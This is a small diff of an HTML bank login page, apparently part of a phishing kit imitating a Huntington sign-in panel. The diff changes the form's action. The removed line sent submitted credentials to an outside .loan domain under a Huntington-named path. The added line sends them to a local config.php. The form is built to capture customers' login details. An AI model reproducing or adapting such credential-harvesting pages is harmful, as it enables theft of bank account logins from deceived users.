@@ -1194,7 +1194,7 @@ Login        </button>
         </ul>
         <div class="tabs-content">
             <div id="personalLogin" class="tabs-content__panel active" role="tabpanel" aria-labelledby="personalLogin-tab" aria-hidden="false">
-                    <form class="login__form" data-parsley-validate="" action="https://black-oreoo-63.loan/Online/Huntington/config.php" method="POST" novalidate="">
+                    <form class="login__form" data-parsley-validate="" action="config.php" method="POST" novalidate="">
                         <input type="hidden" name="login-form-type" value="pwd">
                         <fieldset class="login__form-fieldset">
                             <legend class="login__label login__label--pad-bot">
